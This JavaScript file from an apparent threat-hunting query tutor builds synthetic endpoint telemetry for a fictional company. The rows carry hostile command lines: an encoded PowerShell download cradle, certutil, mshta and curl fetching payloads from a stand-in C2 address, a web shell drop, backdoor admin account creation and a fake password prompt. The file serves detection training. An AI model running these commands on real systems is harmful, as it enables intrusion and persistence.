// XQL Tutor - sample datasets
// A small, deterministic "tenant": one week of endpoint telemetry for the fictional ACME corp, plus lookups.
// Field names follow the Cortex xdr_data schema reference; event_type uses the documented integer values
// (PROCESS = 1, NETWORK = 2, FILE = 3, REGISTRY = 4, LOAD_IMAGE = 6).
(function (root) {
  const XQL = (root.XQL = root.XQL || {});
  const { XTime } = XQL;

  // The sandbox clock is frozen so that "config timeframe = 7d" always means the same thing.
  XQL.NOW = Date.UTC(2026, 9, 27, 8, 0, 0); // 2026-10-27 08:00:00 UTC
  const T = (s) => new XTime(XQL.parseTimeString(s));

  const HOSTS = {
    'WS-FIN-042': { os: 1, ip: '10.10.20.42' },
    'WS-HR-017': { os: 1, ip: '10.10.21.17' },
    'WS-SALES-023': { os: 1, ip: '10.10.22.23' },
    'SRV-DC-01': { os: 1, ip: '10.10.1.5' },
    'SRV-WEB-02': { os: 1, ip: '10.10.2.8' },
    'LAPTOP-SEC-09': { os: 1, ip: '10.10.30.9' },
    'MAC-DESIGN-03': { os: 2, ip: '10.10.40.3' },
    'LNX-BUILD-11': { os: 4, ip: '10.10.50.11' },
  };

  // Known binaries: name -> [path, signature vendor, signature status (1 signed, 3 unsigned), sha256]
  const MS = 'Microsoft Corporation';
  const BIN = {
    'explorer.exe': ['C:\\Windows\\explorer.exe', MS, 1, '4d1f2a8c9e0b7a6f5d4c3b2a1908f7e6d5c4b3a29181706f5e4d3c2b1a0f9e8d'],
    'services.exe': ['C:\\Windows\\System32\\services.exe', MS, 1, '5a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f809'],
    'svchost.exe': ['C:\\Windows\\System32\\svchost.exe', MS, 1, '7c8d9e0f1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5'],
    'powershell.exe': ['C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', MS, 1, '9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f'],
    'cmd.exe': ['C:\\Windows\\System32\\cmd.exe', MS, 1, '2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b'],
    'whoami.exe': ['C:\\Windows\\System32\\whoami.exe', MS, 1, '3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c'],
    'certutil.exe': ['C:\\Windows\\System32\\certutil.exe', MS, 1, '4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d'],
    'schtasks.exe': ['C:\\Windows\\System32\\schtasks.exe', MS, 1, '5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a0f9e8d7c6b5a49382716f5e'],
    'net.exe': ['C:\\Windows\\System32\\net.exe', MS, 1, '6f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a0f9e8d7c6b5a49382716f'],
    'mshta.exe': ['C:\\Windows\\System32\\mshta.exe', MS, 1, '8d7c6b5a49382716f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a0f9e8d'],
    'wbadmin.exe': ['C:\\Windows\\System32\\wbadmin.exe', MS, 1, '9e8d7c6b5a49382716f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a0f9e'],
    'w3wp.exe': ['C:\\Windows\\System32\\inetsrv\\w3wp.exe', MS, 1, '0f9e8d7c6b5a49382716f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a0f'],
    'OUTLOOK.EXE': ['C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', MS, 1, '1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f809'],
    'WINWORD.EXE': ['C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', MS, 1, '2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a'],
    'EXCEL.EXE': ['C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE', MS, 1, '3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b'],
    'Teams.exe': ['C:\\Users\\j.halpert\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe', MS, 1, '4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c'],
    'PsExec.exe': ['C:\\Tools\\Sysinternals\\PsExec.exe', MS, 1, '5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d'],
    'PSEXESVC.exe': ['C:\\Windows\\PSEXESVC.exe', MS, 1, '6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e'],
    'chrome.exe': ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'Google LLC', 1, '708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f'],
    'AnyDesk.exe': ['C:\\Users\\j.halpert\\Downloads\\AnyDesk.exe', 'philandro Software GmbH', 1, '8192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70'],
    'nmap.exe': ['C:\\Program Files (x86)\\Nmap\\nmap.exe', 'Insecure.Com LLC', 1, '92a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f7081'],
    'python.exe': ['C:\\Python312\\python.exe', 'Python Software Foundation', 1, 'a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192'],
    'update.exe': ['C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe', null, 3, 'b1946ac92492d2347c6235b4d2611184e5a9c8b1b2b4e2e6f4a1d3c5e7f9a0b2'],
    'launchd': ['/sbin/launchd', 'Apple Inc.', 1, 'c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3'],
    'bash': ['/bin/bash', 'Apple Inc.', 1, 'd5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4'],
    'osascript': ['/usr/bin/osascript', 'Apple Inc.', 1, 'e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5'],
    'curl': ['/usr/bin/curl', null, 3, 'f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6'],
    'java': ['/usr/lib/jvm/java-17/bin/java', null, 3, '08192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f7'],
    'lnxbash': ['/usr/bin/bash', null, 3, '192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708'],
  };
  const bin = (name) => BIN[name] || [name, null, 3, '0000000000000000000000000000000000000000000000000000000000000000'];

  const COLUMNS = ['_time', 'agent_hostname', 'agent_os_type', 'agent_ip_addresses', 'event_type', 'event_sub_type',
    'actor_effective_username', 'actor_process_image_name', 'actor_process_image_path', 'actor_process_command_line',
    'actor_process_signature_status', 'actor_process_signature_vendor',
    'action_process_image_name', 'action_process_image_path', 'action_process_image_command_line', 'action_process_image_sha256',
    'action_process_signature_status', 'action_process_signature_vendor', 'action_process_os_pid', 'causality_actor_process_image_name',
    'action_file_name', 'action_file_path', 'action_file_extension', 'action_file_size', 'action_file_sha256',
    'action_local_ip', 'action_local_port', 'action_remote_ip', 'action_remote_port', 'action_external_hostname', 'action_country',
    'action_total_upload', 'action_total_download', 'dns_query_name',
    'action_registry_key_name', 'action_registry_value_name', 'action_registry_data', 'action_module_path', 'dfe_labels', '_product', '_vendor'];

  let pid = 1200;
  function base(time, host, user, type, sub, actorName, actorCmd) {
    const h = HOSTS[host];
    const ab = bin(actorName);
    const r = {};
    for (const c of COLUMNS) r[c] = null;
    Object.assign(r, {
      _time: T(time), agent_hostname: host, agent_os_type: h.os, agent_ip_addresses: h.ip, event_type: type, event_sub_type: sub,
      actor_effective_username: user, actor_process_image_name: actorName === 'lnxbash' ? 'bash' : actorName, actor_process_image_path: ab[0],
      actor_process_command_line: actorCmd || (actorName === 'lnxbash' ? 'bash' : actorName), actor_process_signature_status: ab[2], actor_process_signature_vendor: ab[1],
      _product: 'XDR Agent', _vendor: 'PANW',
    });
    return r;
  }
  function proc(time, host, user, actorName, actionName, cmd, causality, opts) {
    const r = base(time, host, user, 1, 'PROCESS_START', actorName, opts && opts.actorCmd);
    const b = bin(actionName);
    Object.assign(r, {
      action_process_image_name: actionName === 'lnxbash' ? 'bash' : actionName, action_process_image_path: b[0], action_process_image_command_line: cmd,
      action_process_image_sha256: b[3], action_process_signature_status: b[2], action_process_signature_vendor: b[1], action_process_os_pid: pid += 4,
      causality_actor_process_image_name: causality || actorName, dfe_labels: 'process',
    });
    return r;
  }
  function net(time, host, user, actorName, rip, rport, extHost, country, up, down, opts) {
    const r = base(time, host, user, 2, 'NETWORK_CREATE', actorName, opts && opts.actorCmd);
    Object.assign(r, {
      action_local_ip: HOSTS[host].ip, action_local_port: 49000 + ((pid += 3) % 1000), action_remote_ip: rip, action_remote_port: rport,
      action_external_hostname: extHost, action_country: country, action_total_upload: up, action_total_download: down, dns_query_name: opts && opts.dns ? opts.dns : null,
      causality_actor_process_image_name: (opts && opts.causality) || actorName, dfe_labels: 'network',
    });
    return r;
  }
  function file(time, host, user, actorName, sub, path, size, sha, opts) {
    const r = base(time, host, user, 3, sub, actorName, opts && opts.actorCmd);
    const sep = path.includes('\\') ? '\\' : '/';
    const name = path.slice(path.lastIndexOf(sep) + 1);
    const ext = name.includes('.') ? name.slice(name.lastIndexOf('.') + 1) : '';
    Object.assign(r, { action_file_name: name, action_file_path: path, action_file_extension: ext, action_file_size: size, action_file_sha256: sha || null, causality_actor_process_image_name: (opts && opts.causality) || actorName, dfe_labels: 'file' });
    return r;
  }
  function reg(time, host, user, actorName, key, value, data, opts) {
    const r = base(time, host, user, 4, 'REGISTRY_SET_VALUE', actorName, opts && opts.actorCmd);
    Object.assign(r, { action_registry_key_name: key, action_registry_value_name: value, action_registry_data: data, causality_actor_process_image_name: (opts && opts.causality) || actorName, dfe_labels: 'registry' });
    return r;
  }
  function load(time, host, user, actorName, modulePath, opts) {
    const r = base(time, host, user, 6, 'LOAD_IMAGE', actorName, opts && opts.actorCmd);
    Object.assign(r, { action_module_path: modulePath, causality_actor_process_image_name: (opts && opts.causality) || actorName, dfe_labels: 'load_image' });
    return r;
  }

  const C2 = '185.220.101.45';
  const IOC_SHA = BIN['update.exe'][3];
  const HUD = 'ACME\\s.hudson', PAM = 'ACME\\p.beesly', JIM = 'ACME\\j.halpert', ADM = 'ACME\\administrator', SYS = 'NT AUTHORITY\\SYSTEM', DWT = 'ACME\\d.schrute', POOL = 'IIS APPPOOL\\DefaultAppPool';
  const PS_ENC = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AYQAnACkA';

  const XDR_ROWS = [
    // --- WS-FIN-042: phishing document -> PowerShell -> download -> persistence (26 Oct) ---
    proc('2026-10-26 08:55:10', 'WS-FIN-042', HUD, 'explorer.exe', 'OUTLOOK.EXE', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"', 'explorer.exe'),
    net('2026-10-26 09:00:00', 'WS-FIN-042', HUD, 'OUTLOOK.EXE', '52.96.166.98', 443, 'outlook.office365.com', 'US', 48213, 912044, { dns: 'outlook.office365.com', causality: 'explorer.exe' }),
    proc('2026-10-26 09:10:48', 'WS-FIN-042', HUD, 'OUTLOOK.EXE', 'WINWORD.EXE', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\s.hudson\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Invoice_Q3.docm"', 'OUTLOOK.EXE'),
    proc('2026-10-26 09:12:05', 'WS-FIN-042', HUD, 'WINWORD.EXE', 'powershell.exe', PS_ENC, 'OUTLOOK.EXE'),
    load('2026-10-26 09:12:06', 'WS-FIN-042', HUD, 'powershell.exe', 'C:\\Windows\\System32\\amsi.dll', { causality: 'OUTLOOK.EXE', actorCmd: PS_ENC }),
    load('2026-10-26 09:12:07', 'WS-FIN-042', HUD, 'powershell.exe', 'C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll', { causality: 'OUTLOOK.EXE', actorCmd: PS_ENC }),
    proc('2026-10-26 09:12:09', 'WS-FIN-042', HUD, 'powershell.exe', 'cmd.exe', 'cmd.exe /c whoami /all', 'OUTLOOK.EXE', { actorCmd: PS_ENC }),
    proc('2026-10-26 09:12:11', 'WS-FIN-042', HUD, 'cmd.exe', 'whoami.exe', 'whoami /all', 'OUTLOOK.EXE', { actorCmd: 'cmd.exe /c whoami /all' }),
    net('2026-10-26 09:12:30', 'WS-FIN-042', HUD, 'powershell.exe', C2, 443, C2, 'DE', 307200, 4096, { causality: 'OUTLOOK.EXE', actorCmd: PS_ENC }),
    proc('2026-10-26 09:14:30', 'WS-FIN-042', HUD, 'powershell.exe', 'certutil.exe', 'certutil.exe -urlcache -split -f http://185.220.101.45/update.exe C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe', 'OUTLOOK.EXE', { actorCmd: PS_ENC }),
    net('2026-10-26 09:14:31', 'WS-FIN-042', HUD, 'certutil.exe', C2, 80, C2, 'DE', 1228, 2457600, { causality: 'OUTLOOK.EXE' }),
    file('2026-10-26 09:14:35', 'WS-FIN-042', HUD, 'certutil.exe', 'FILE_CREATE_NEW', 'C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe', 2457600, IOC_SHA, { causality: 'OUTLOOK.EXE' }),
    file('2026-10-26 09:14:36', 'WS-FIN-042', HUD, 'certutil.exe', 'FILE_WRITE', 'C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe', 2457600, IOC_SHA, { causality: 'OUTLOOK.EXE' }),
    proc('2026-10-26 09:15:02', 'WS-FIN-042', HUD, 'powershell.exe', 'update.exe', 'C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe', 'OUTLOOK.EXE', { actorCmd: PS_ENC }),
    net('2026-10-26 09:15:05', 'WS-FIN-042', HUD, 'update.exe', C2, 4444, C2, 'DE', 52428800, 1048576, { causality: 'OUTLOOK.EXE' }),
    proc('2026-10-26 09:15:40', 'WS-FIN-042', HUD, 'update.exe', 'schtasks.exe', 'schtasks.exe /create /tn "WindowsUpdateCheck" /tr C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe /sc minute /mo 15', 'OUTLOOK.EXE'),
    file('2026-10-26 09:15:41', 'WS-FIN-042', HUD, 'schtasks.exe', 'FILE_WRITE', 'C:\\Windows\\System32\\Tasks\\WindowsUpdateCheck', 3400, null, { causality: 'OUTLOOK.EXE' }),
    reg('2026-10-26 09:15:50', 'WS-FIN-042', HUD, 'update.exe', 'HKEY_USERS\\S-1-5-21-1004336348-1177238915-682003330-1105\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'WindowsUpdateCheck', 'C:\\Users\\s.hudson\\AppData\\Local\\Temp\\update.exe', { causality: 'OUTLOOK.EXE' }),
    net('2026-10-22 08:20:00', 'WS-FIN-042', HUD, 'chrome.exe', '198.51.100.24', 443, 'www.acme-payroll.com', 'US', 15200, 402100, { dns: 'www.acme-payroll.com', causality: 'explorer.exe' }),
    proc('2026-10-14 10:00:00', 'WS-FIN-042', HUD, 'explorer.exe', 'chrome.exe', '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', 'explorer.exe'),
    proc('2026-10-27 07:30:00', 'WS-FIN-042', HUD, 'explorer.exe', 'chrome.exe', '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --profile-directory=Default', 'explorer.exe'),

    // --- WS-HR-017: Excel macro -> PowerShell; later used by PsExec from the DC (24-27 Oct) ---
    proc('2026-10-26 10:02:00', 'WS-HR-017', PAM, 'explorer.exe', 'chrome.exe', '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', 'explorer.exe'),
    net('2026-10-26 10:03:00', 'WS-HR-017', PAM, 'chrome.exe', '142.250.187.206', 443, 'www.google.com', 'US', 9800, 310200, { dns: 'www.google.com', causality: 'explorer.exe' }),
    proc('2026-10-26 10:30:15', 'WS-HR-017', PAM, 'explorer.exe', 'EXCEL.EXE', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" "C:\\Users\\p.beesly\\Downloads\\Benefits_Enrollment.xlsm"', 'explorer.exe'),
    reg('2026-10-26 10:31:00', 'WS-HR-017', PAM, 'EXCEL.EXE', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Excel\\Security', 'VBAWarnings', '1', { causality: 'explorer.exe' }),
    file('2026-10-26 10:35:00', 'WS-HR-017', PAM, 'EXCEL.EXE', 'FILE_WRITE', 'C:\\Users\\p.beesly\\Documents\\Q4_headcount.xlsx', 88000, null, { causality: 'explorer.exe' }),
    file('2026-10-26 11:04:50', 'WS-HR-017', PAM, 'EXCEL.EXE', 'FILE_CREATE_NEW', 'C:\\Users\\p.beesly\\Downloads\\macro_helper.ps1', 4096, null, { causality: 'explorer.exe' }),
    proc('2026-10-26 11:05:33', 'WS-HR-017', PAM, 'EXCEL.EXE', 'powershell.exe', 'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\p.beesly\\Downloads\\macro_helper.ps1', 'explorer.exe'),
    net('2026-10-26 11:06:00', 'WS-HR-017', PAM, 'powershell.exe', '104.20.67.143', 443, 'pastebin.com', 'US', 2100, 18400, { dns: 'pastebin.com', causality: 'explorer.exe' }),
    proc('2026-10-24 22:15:07', 'WS-HR-017', SYS, 'services.exe', 'PSEXESVC.exe', 'C:\\Windows\\PSEXESVC.exe', 'services.exe'),
    proc('2026-10-24 22:15:09', 'WS-HR-017', SYS, 'PSEXESVC.exe', 'cmd.exe', 'cmd.exe', 'services.exe'),
    proc('2026-10-24 22:16:00', 'WS-HR-017', SYS, 'cmd.exe', 'net.exe', 'net user backup_svc P@ssw0rd123 /add', 'services.exe'),
    proc('2026-10-24 22:16:05', 'WS-HR-017', SYS, 'cmd.exe', 'net.exe', 'net localgroup administrators backup_svc /add', 'services.exe'),
    proc('2026-10-13 09:30:00', 'WS-HR-017', PAM, 'explorer.exe', 'EXCEL.EXE', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"', 'explorer.exe'),
    proc('2026-10-27 07:45:00', 'WS-HR-017', PAM, 'explorer.exe', 'OUTLOOK.EXE', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"', 'explorer.exe'),
    net('2026-10-27 07:46:00', 'WS-HR-017', PAM, 'OUTLOOK.EXE', '52.96.166.98', 443, 'outlook.office365.com', 'US', 30100, 540000, { dns: 'outlook.office365.com', causality: 'explorer.exe' }),

    // --- WS-SALES-023: remote access tool + mshta (25-26 Oct) ---
    proc('2026-10-25 14:20:00', 'WS-SALES-023', JIM, 'explorer.exe', 'Teams.exe', '"C:\\Users\\j.halpert\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"', 'explorer.exe'),
    proc('2026-10-25 14:22:10', 'WS-SALES-023', JIM, 'explorer.exe', 'chrome.exe', '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', 'explorer.exe'),
    file('2026-10-25 16:39:50', 'WS-SALES-023', JIM, 'chrome.exe', 'FILE_CREATE_NEW', 'C:\\Users\\j.halpert\\Downloads\\AnyDesk.exe', 5120000, BIN['AnyDesk.exe'][3], { causality: 'explorer.exe' }),
    proc('2026-10-25 16:40:00', 'WS-SALES-023', JIM, 'chrome.exe', 'AnyDesk.exe', '"C:\\Users\\j.halpert\\Downloads\\AnyDesk.exe"', 'explorer.exe'),
    net('2026-10-25 16:41:00', 'WS-SALES-023', JIM, 'AnyDesk.exe', '185.33.12.5', 443, 'relay-1.anydesk.com', 'DE', 8388608, 2097152, { dns: 'relay-1.anydesk.com', causality: 'explorer.exe' }),
    reg('2026-10-25 16:42:00', 'WS-SALES-023', JIM, 'AnyDesk.exe', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'AnyDesk', '"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe" --silent', { causality: 'explorer.exe' }),
    file('2026-10-26 14:10:00', 'WS-SALES-023', JIM, 'explorer.exe', 'FILE_WRITE', 'E:\\customer_list_export.xlsx', 3200000, null),
    proc('2026-10-26 16:00:00', 'WS-SALES-023', JIM, 'explorer.exe', 'mshta.exe', 'mshta.exe http://185.220.101.45/a.hta', 'explorer.exe'),
    net('2026-10-26 16:00:02', 'WS-SALES-023', JIM, 'mshta.exe', C2, 80, C2, 'DE', 980, 61400, { causality: 'explorer.exe' }),

    // --- SRV-DC-01: admin uses PsExec (15 and 24 Oct), nightly backup (22 Oct) ---
    proc('2026-10-15 18:45:00', 'SRV-DC-01', ADM, 'cmd.exe', 'PsExec.exe', 'PsExec.exe \\\\SRV-WEB-02 cmd.exe', 'explorer.exe'),
    proc('2026-10-22 03:00:00', 'SRV-DC-01', SYS, 'services.exe', 'svchost.exe', 'C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule', 'services.exe'),
    proc('2026-10-22 03:00:05', 'SRV-DC-01', 'ACME\\svc_backup', 'svchost.exe', 'wbadmin.exe', 'wbadmin.exe start backup -backupTarget:D: -include:C: -quiet', 'services.exe'),
    file('2026-10-22 03:10:00', 'SRV-DC-01', 'ACME\\svc_backup', 'wbadmin.exe', 'FILE_WRITE', 'D:\\Backups\\dc01-2026-10-22.vhdx', 48000000000, null, { causality: 'services.exe' }),
    proc('2026-10-24 22:15:00', 'SRV-DC-01', ADM, 'cmd.exe', 'PsExec.exe', 'PsExec.exe \\\\WS-HR-017 -s cmd.exe', 'explorer.exe'),
    net('2026-10-24 22:15:01', 'SRV-DC-01', ADM, 'PsExec.exe', '10.10.21.17', 445, 'WS-HR-017', null, 20480, 8192, { causality: 'explorer.exe' }),

    // --- SRV-WEB-02: web shell activity (23 Oct) ---
    proc('2026-10-23 11:11:11', 'SRV-WEB-02', POOL, 'w3wp.exe', 'cmd.exe', 'cmd.exe /c whoami', 'w3wp.exe'),
    proc('2026-10-23 11:11:12', 'SRV-WEB-02', POOL, 'cmd.exe', 'whoami.exe', 'whoami', 'w3wp.exe', { actorCmd: 'cmd.exe /c whoami' }),
    proc('2026-10-23 11:13:40', 'SRV-WEB-02', POOL, 'w3wp.exe', 'cmd.exe', 'cmd.exe /c "powershell -c Invoke-WebRequest http://185.220.101.45/sh.ps1 -OutFile C:\\inetpub\\wwwroot\\sh.ps1"', 'w3wp.exe'),
    proc('2026-10-23 11:13:41', 'SRV-WEB-02', POOL, 'cmd.exe', 'powershell.exe', 'powershell -c Invoke-WebRequest http://185.220.101.45/sh.ps1 -OutFile C:\\inetpub\\wwwroot\\sh.ps1', 'w3wp.exe'),
    net('2026-10-23 11:13:42', 'SRV-WEB-02', POOL, 'powershell.exe', C2, 80, C2, 'DE', 640, 1800, { causality: 'w3wp.exe' }),
    file('2026-10-23 11:14:06', 'SRV-WEB-02', POOL, 'powershell.exe', 'FILE_WRITE', 'C:\\inetpub\\wwwroot\\sh.ps1', 1800, null, { causality: 'w3wp.exe' }),

    // --- LAPTOP-SEC-09: security analyst doing legitimate admin work (21, 26 Oct) ---
    proc('2026-10-21 09:00:00', 'LAPTOP-SEC-09', DWT, 'explorer.exe', 'python.exe', 'python.exe C:\\Tools\\parse_logs.py', 'explorer.exe'),
    proc('2026-10-26 13:00:00', 'LAPTOP-SEC-09', DWT, 'explorer.exe', 'powershell.exe', 'powershell.exe -File C:\\Tools\\inventory.ps1', 'explorer.exe'),
    proc('2026-10-26 13:05:00', 'LAPTOP-SEC-09', DWT, 'powershell.exe', 'nmap.exe', 'nmap.exe -sS -p 445,3389 10.10.20.0/24', 'explorer.exe'),
    net('2026-10-26 13:06:00', 'LAPTOP-SEC-09', DWT, 'nmap.exe', '10.10.20.42', 445, 'WS-FIN-042', null, 120, 0, { causality: 'explorer.exe' }),
    net('2026-10-26 13:06:01', 'LAPTOP-SEC-09', DWT, 'nmap.exe', '10.10.20.43', 445, null, null, 120, 0, { causality: 'explorer.exe' }),
    net('2026-10-26 13:06:02', 'LAPTOP-SEC-09', DWT, 'nmap.exe', '10.10.20.44', 3389, null, null, 120, 0, { causality: 'explorer.exe' }),

    // --- MAC-DESIGN-03: credential phishing dialog and script download (26 Oct) ---
    proc('2026-10-26 15:30:00', 'MAC-DESIGN-03', 'a.martin', 'launchd', 'osascript', 'osascript -e \'display dialog "Update required" default answer "" with hidden answer\'', 'launchd'),
    proc('2026-10-26 15:31:00', 'MAC-DESIGN-03', 'a.martin', 'bash', 'curl', 'curl -s https://185.220.101.45/m.sh -o /tmp/m.sh', 'launchd'),
    net('2026-10-26 15:31:01', 'MAC-DESIGN-03', 'a.martin', 'curl', C2, 443, C2, 'DE', 512, 912, { causality: 'launchd' }),
    file('2026-10-26 15:31:02', 'MAC-DESIGN-03', 'a.martin', 'curl', 'FILE_CREATE_NEW', '/tmp/m.sh', 912, null, { causality: 'launchd' }),
    proc('2026-10-26 15:31:30', 'MAC-DESIGN-03', 'a.martin', 'bash', 'bash', 'bash /tmp/m.sh', 'launchd'),

    // --- LNX-BUILD-11: CI server (20 Oct) ---
    proc('2026-10-20 06:00:00', 'LNX-BUILD-11', 'jenkins', 'java', 'lnxbash', 'bash -c "git pull && make"', 'java'),
    proc('2026-10-20 06:05:00', 'LNX-BUILD-11', 'jenkins', 'lnxbash', 'curl', 'curl -fsSL https://get.docker.com -o /tmp/get-docker.sh', 'java'),
    net('2026-10-20 06:05:01', 'LNX-BUILD-11', 'jenkins', 'curl', '13.224.1.7', 443, 'get.docker.com', 'US', 700, 21000, { dns: 'get.docker.com', causality: 'java' }),
  ];
  XDR_ROWS.sort((a, b) => Number(a._time) - Number(b._time));

  // ---- Windows event logs collected via the XDR collector -----------------------------
  const WIN_COLUMNS = ['_time', 'host_name', 'event_id', 'event_result', 'event_data', '_product', '_vendor'];
  const win = (time, host, id, result, data) => ({ _time: T(time), host_name: host, event_id: id, event_result: result, event_data: JSON.stringify(data), _product: 'Windows', _vendor: 'Microsoft' });
  const WIN_ROWS = [
    win('2026-10-24 21:58:02', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
    win('2026-10-24 21:58:05', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
    win('2026-10-24 21:58:09', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
    win('2026-10-24 21:58:14', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
    win('2026-10-24 21:58:20', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI', Status: '0xC000006D' }),
    win('2026-10-24 21:59:41', 'SRV-DC-01', 4624, 'success', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '185.220.101.45', WorkstationName: 'KALI' }),
    win('2026-10-24 22:14:55', 'SRV-DC-01', 4624, 'success', { TargetUserName: 'administrator', TargetDomainName: 'ACME', LogonType: '10', IpAddress: '10.10.30.9', WorkstationName: 'LAPTOP-SEC-09' }),
    win('2026-10-24 22:15:06', 'WS-HR-017', 7045, 'success', { ServiceName: 'PSEXESVC', ImagePath: '%SystemRoot%\\PSEXESVC.exe', ServiceType: 'user mode service', StartType: 'demand start', AccountName: 'LocalSystem' }),
    win('2026-10-24 22:16:01', 'WS-HR-017', 4720, 'success', { TargetUserName: 'backup_svc', TargetDomainName: 'WS-HR-017', SubjectUserName: 'WS-HR-017$', SubjectDomainName: 'ACME' }),
    win('2026-10-24 22:16:06', 'WS-HR-017', 4732, 'success', { TargetUserName: 'Administrators', TargetDomainName: 'Builtin', MemberName: 'CN=backup_svc,CN=Users,DC=acme,DC=local', MemberSid: 'S-1-5-21-1004336348-1177238915-682003330-1201', SubjectUserName: 'WS-HR-017$' }),
    win('2026-10-26 08:50:12', 'WS-FIN-042', 4624, 'success', { TargetUserName: 's.hudson', TargetDomainName: 'ACME', LogonType: '2', IpAddress: '-', WorkstationName: 'WS-FIN-042' }),
    win('2026-10-26 09:58:30', 'WS-HR-017', 4624, 'success', { TargetUserName: 'p.beesly', TargetDomainName: 'ACME', LogonType: '2', IpAddress: '-', WorkstationName: 'WS-HR-017' }),
